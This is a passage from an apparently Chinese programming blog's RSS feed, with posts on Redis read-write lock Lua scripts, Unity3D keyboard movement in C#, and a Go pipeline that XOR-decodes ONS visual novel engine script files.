&lt;span class="kr">if&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;hlen&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="s2">&amp;#34;:read&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kr">then&lt;/span>
&lt;span class="kr">return&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="kr">else&lt;/span>
&lt;span class="kr">return&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;setnx&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="s2">&amp;#34;:write&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ARGV&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="kr">end&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="解读锁">解读锁&lt;/h3>
&lt;p>读锁的解除只需要删除 hash table 里的自己就行了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-lua" data-lang="lua">&lt;span class="c1">-- 解读锁&lt;/span>
&lt;span class="kr">return&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;hdel&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="s2">&amp;#34;:read&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ARGV&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="解写锁">解写锁&lt;/h3>
&lt;p>写锁解除如解除简单锁一样。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-lua" data-lang="lua">&lt;span class="c1">-- 解锁&lt;/span>
&lt;span class="kr">if&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;get&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="s2">&amp;#34;:write&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">ARGV&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="kr">then&lt;/span>
&lt;span class="kr">return&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;del&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="s2">&amp;#34;:write&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="kr">else&lt;/span>
&lt;span class="kr">return&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="kr">end&lt;/span>
&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>unity3d 键盘控制移动</title><link>https://nnnewb.github.io/blog/p/unity3d-%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E7%A7%BB%E5%8A%A8/</link><pubDate>Mon, 17 Dec 2018 02:29:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/unity3d-%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E7%A7%BB%E5%8A%A8/</guid><description>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c#" data-lang="c#">&lt;span class="k">void&lt;/span> &lt;span class="n">HandleKeyboardAction&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="kt">var&lt;/span> &lt;span class="n">horizontal&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">Input&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetAxis&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Horizontal&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">PlayerMotionScaleLevel&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">deltaTime&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">var&lt;/span> &lt;span class="n">vertical&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">Input&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GetAxis&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Vertical&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">PlayerMotionScaleLevel&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">deltaTime&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">var&lt;/span> &lt;span class="n">motion&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">transform&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">rotation&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">Vector3&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">horizontal&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="m">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">vertical&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">var&lt;/span> &lt;span class="n">mag&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">motion&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">magnitude&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">motion&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">y&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="m">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">Player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">transform&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">position&lt;/span> &lt;span class="p">+=&lt;/span> &lt;span class="n">motion&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">normalized&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">mag&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>极其简单的做法，获取到键盘移动的轴之后，用摄像机的旋转四元数乘一下，即可得到旋转后的向量，加上去就 ok 了。&lt;/p>
&lt;p>需要注意的是这里用摄像机的四元数旋转要求摄像机必须只在 x 和 y 两个轴旋转。&lt;/p>
&lt;p>先备份一下三维向量的数量值，这是为了能保证摄像机向上和向下看时，平面 x 和 z 轴上的分量不会过小，保持一致的移动速度。&lt;/p>
&lt;p>用四元数旋转完成后，去除 y 轴的值，使目标只在当前平面上移动。再用算出来的向量的单位向量乘上之前备份的数量值，得到平面上移动的偏移向量。&lt;/p>
&lt;p>最后，算出新的位置坐标。&lt;/p></description></item><item><title>go语言实战之解密ons脚本</title><link>https://nnnewb.github.io/blog/p/go%E8%AF%AD%E8%A8%80%E5%AE%9E%E6%88%98%E4%B9%8B%E8%A7%A3%E5%AF%86ons%E8%84%9A%E6%9C%AC/</link><pubDate>Sun, 16 Dec 2018 23:44:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/go%E8%AF%AD%E8%A8%80%E5%AE%9E%E6%88%98%E4%B9%8B%E8%A7%A3%E5%AF%86ons%E8%84%9A%E6%9C%AC/</guid><description>&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>ons 是一个开放源代码的视觉小说引擎，以简单实用出名。本博用 golang 来解密 ons 引擎的&lt;code>.dat&lt;/code>和&lt;code>.nt2&lt;/code>脚本，主要实践目标是异步解密输出。&lt;/p>
&lt;h2 id="算法">算法&lt;/h2>
&lt;p>&lt;code>.dat&lt;/code>的加密非常简单，一次异或。密码是&lt;code>0x84&lt;/code>。&lt;/p>
&lt;p>可以用 go 非常简单粗暴地写出以下代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">^=&lt;/span> &lt;span class="mh">0x84&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>.nt2&lt;/code>的加密同样简单，一次异或，密码是&lt;code>0x85 &amp;amp; 0x97&lt;/code>。&lt;/p>
&lt;p>可以用 go 非常粗暴地写出以下代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">^&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mh">0x85&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0x97&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="异步读文件">异步读文件&lt;/h2>
&lt;p>go 方式比较多，&lt;code>ioutil&lt;/code>或者&lt;code>bufio&lt;/code>或者&lt;code>os&lt;/code>都有文件模块。这里采用&lt;code>bufio&lt;/code>套&lt;code>os.Open&lt;/code>的方式读文件。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">readFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 只读方式打开文件
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">OpenFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">O_RDONLY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mo">0644&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 包装一层 bufio
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">reader&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">bufio&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewReader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">file&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1">// 准备一个保存读取结果的buf
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">var&lt;/span> &lt;span class="nx">buf&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">new&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="mi">1024000&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 循环读
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">n&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">reader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">[:])&lt;/span>
&lt;span class="c1">// 没有内容了就退出循环
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="nx">n&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 把读到的结果用 channel 传递给下一道处理工序
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">outChannel&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">buf&lt;/span>&lt;span class="p">[:&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">outChannel&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="异步写文件">异步写文件&lt;/h2>
&lt;p>写文件的方式和读文件的方式差不多，由那几个包提供。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">writeFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">done&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="kt">bool&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 只读方式打开文件，已存在文件则清空内容，未存在文件则创建，文件权限 rw-r--r--
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">OpenFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">O_WRONLY&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">O_TRUNC&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">O_CREATE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mo">0644&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">writer&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">bufio&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewWriter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">file&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 从上一道工序取得解密后的数据
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">more&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">outChannel&lt;/span>
&lt;span class="c1">// 如果所有数据全部取得，则结束写入
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">more&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 写入
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">writer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">writer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Flush&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">done&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="kc">true&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="异步解密">异步解密&lt;/h2>
&lt;p>解密过程就像是水管上的过滤器，水流进来处理好，流出去。内容乏善可陈，就直接丢代码好了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">decodeDat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inChannel&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">more&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">inChannel&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">more&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">^=&lt;/span> &lt;span class="mh">0x84&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">outChannel&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">buf&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">outChannel&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">decodeNt2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inChannel&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">more&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">inChannel&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">more&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">^&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mh">0x85&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0x97&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">outChannel&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">buf&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">outChannel&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="调度">调度&lt;/h2>
&lt;p>严肃地说，我认为这种调度模式是显然不对的。正确的调度方式应该是这样。&lt;/p>
&lt;pre>&lt;code class="language-mermaid" data-lang="mermaid">graph TB;
A[cli] --&amp;gt; |启动|B[read worker];
A --&amp;gt; |启动| C[write worker];
A --&amp;gt; |启动| D[decode worker];
A --&amp;gt; |启动| E[scheduler];
E --&amp;gt; |发出读指令| B;
B --&amp;gt; |发送来源标识符+内容| D;
D --&amp;gt; |发送来源标识符+处理后的内容| C;
&lt;/code>&lt;/pre>&lt;p>对于有多个 worker 的情况，也需要调度器协调才行，不过直觉上来说硬盘读写性能会是先一步的瓶颈。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Args&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
